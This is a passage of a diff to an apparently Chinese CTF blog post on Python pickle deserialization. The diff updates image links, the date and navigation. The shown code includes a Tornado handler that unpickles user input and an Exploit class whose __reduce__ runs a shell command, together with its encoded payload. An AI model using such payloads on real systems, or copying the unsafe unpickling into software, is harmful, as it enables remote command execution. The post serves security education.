class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = <span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure>
 
@@ -1091,9 +1092,9 @@
 <p>这里有一个疑惑就是为什么将urllib.quote的用法改为python3可用的跑出来的就不行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (subprocess.check_output, ([<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>],))<br><br>payload = quote(pickle.dumps(Exploit()))<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment">#运行结果%80%04%950%00%00%00%00%00%00%00%8C%0Asubprocess%94%8C%0Ccheck_output%94%93%94%5D%94%28%8C%02ls%94%8C%01/%94e%85%94R%94.</span><br></code></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194751162.png" srcset="/img/loading.gif" lazyload alt="image-20260315194751162"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191509413.png" srcset="/img/loading.gif" lazyload alt="image-20260324191509413"></p>
 <p>然后就是经典的cat &#x2F;flag.txt再跑一下之后传参就ok了</p>
-<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260315194753938.png" srcset="/img/loading.gif" lazyload alt="image-20260315194753938"></p>
+<p><img src="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260324191512252.png" srcset="/img/loading.gif" lazyload alt="image-20260324191512252"></p>
 
                 
               </div>
@@ -1165,7 +1166,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年3月15日</div>
+          <div>2026年3月24日</div>
         </div>
       
       
@@ -1196,9 +1197,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/03/15/DNS%E9%87%8D%E7%BB%91%E5%AE%9A/" title="DNS重绑定">
+                      <a href="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" title="内网渗透靶场1">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">DNS重绑定</span>
+                        <span class="hidden-mobile">内网渗透靶场1</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
